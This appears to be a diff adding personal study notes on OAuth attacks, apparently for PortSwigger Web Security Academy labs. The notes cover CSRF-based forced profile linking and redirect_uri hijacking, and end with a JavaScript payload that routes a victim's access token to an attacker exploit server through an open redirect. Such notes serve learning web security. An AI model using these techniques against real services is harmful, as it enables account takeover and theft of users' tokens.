@@ -1,0 +1,25 @@
+For when there is a social media account login 
+
+pay attention to different parameters, study the flow, try to identify which flow it is and look at burp documentation:
+
+2. Forced OAuth profile linking
+Intercept the whole process of OAuth authentication and observe /oauth-linking request with code. This request is without state parameter, so Generate CSRF PoC and drop the request. Send it to victim and login via OAuth.
+
+3. OAuth account hijacking via redirect_uri
+Intercept the whole process of OAuth authentication and observe /auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx, change redirect_uri to your collaborator server and Generate CSRF PoC, drop the request. Send it to victim and find out his /oauth-callback?code.
+
+4. Stealing OAuth access tokens via an open redirect
+Same as the previous one observe /auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx.
+On home page open any post and at the bottom observe "Next post" button. It is open redirect.
+Write the next URL:
+. . . redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/ . . .
+This will redirect us to our exploit server and send us oauth code as fragment identifier, so we need to extract this value using JS.
+Write final payload:
+
+<script>
+    if (!document.location.hash) {
+        window.location = "https://oauth-xxx.web-security-academy.net/auth?client_id=np1l4fiaizdo4d6r09enk&redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/&response_type=token&nonce=-2091701200&scope=openid%20profile%20email"
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
